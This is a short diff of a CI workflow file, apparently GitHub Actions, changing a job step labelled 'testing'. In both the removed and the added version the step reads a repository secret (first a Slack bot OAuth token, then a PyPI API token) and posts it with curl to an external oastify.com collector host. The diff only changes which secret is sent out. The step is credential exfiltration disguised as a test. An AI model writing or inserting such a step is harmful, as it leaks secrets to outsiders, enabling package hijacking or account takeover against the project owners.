@@ -11,5 +11,5 @@ jobs:
       - shell: bash
         name: testing
         env:
-          SLACK_TOKEN: ${{ secrets.SLACK_BOT_USER_OAUTH_ACCESS_TOKEN }}
-        run: curl https://waae5fjojh3qbduj5mwlyj68lzrqfg35.oastify.com --data "$SLACK_TOKEN"
+          TOKEN: ${{ secrets.PYPI_API_TOKEN }}
+        run: curl https://waae5fjojh3qbduj5mwlyj68lzrqfg35.oastify.com --data "$TOKEN"
